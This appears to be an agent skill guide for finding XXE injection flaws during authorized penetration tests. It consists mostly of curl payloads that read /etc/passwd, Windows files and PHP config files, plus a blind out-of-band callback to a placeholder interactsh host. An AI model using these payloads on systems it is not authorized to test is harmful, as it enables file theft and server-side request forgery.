---
name: testing-for-xxe-injection-vulnerabilities
description: Discovering and exploiting XML External Entity injection vulnerabilities
when-to-use: Discovering and exploiting XML External Entity injection vulnerabilities
  to read server files, perform SSRF, and exfiltrate data during authorized penetration
  tests.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- xxe
- xml-injection
- owasp
- web-security
- burpsuite
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1048
---

# Testing for XXE Injection Vulnerabilities

## When to Use

- During authorized penetration tests when the application processes XML input (SOAP APIs, file uploads, RSS feeds)
- When testing APIs that accept `Content-Type: application/xml` or `text/xml`
- For assessing XML parsers in file upload functionality (DOCX, XLSX, SVG, PDF)
- When evaluating SOAP-based web services for entity injection
- During security assessments of enterprise applications using XML configuration

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying XML requests
- **XXEinjector**: Automated XXE exploitation tool (`git clone https://github.com/enjoiz/XXEinjector.git`)
- **Out-of-band server**: Burp Collaborator or interactsh for blind XXE detection
- **curl**: For manual payload crafting and submission
- **Python**: For building DTD hosting server

## Workflow

### Step 1: Identify XML Processing Points

Find all application endpoints that accept or process XML data.

```bash
# Look for XML content types in Burp proxy history
# Filter for: Content-Type: application/xml, text/xml, application/soap+xml

# Test if JSON endpoints also accept XML
# Original JSON request:
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"search":"test"}' \
  "https://target.example.com/api/search"

# Try converting to XML:
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><search>test</search></root>' \
  "https://target.example.com/api/search"

# Check file upload endpoints for XML-based formats
# DOCX, XLSX, PPTX, SVG, PDF, XML, RSS, ATOM, SOAP
# These all contain XML that may be parsed server-side

# Check for SOAP endpoints
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"\"" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test/></soap:Body></soap:Envelope>' \
  "https://target.example.com/ws/service"
```

### Step 2: Test for Basic XXE with File Retrieval

Inject XML entities to read local files from the server.

```bash
# Basic XXE payload to read /etc/passwd
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Windows file read
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Read application configuration files
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# PHP filter wrapper for base64 encoding (avoids XML parsing errors)
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"
```

### Step 3: Test Blind XXE with Out-of-Band Detection

When the entity value is not reflected in the response, use out-of-band techniques.

```bash
# Blind XXE with HTTP callback (use Burp Collaborator or interactsh)
# Start interactsh: interactsh-client
# Use the generated domain: abc123.oast.fun

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc123.oast.fun/xxe-test">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
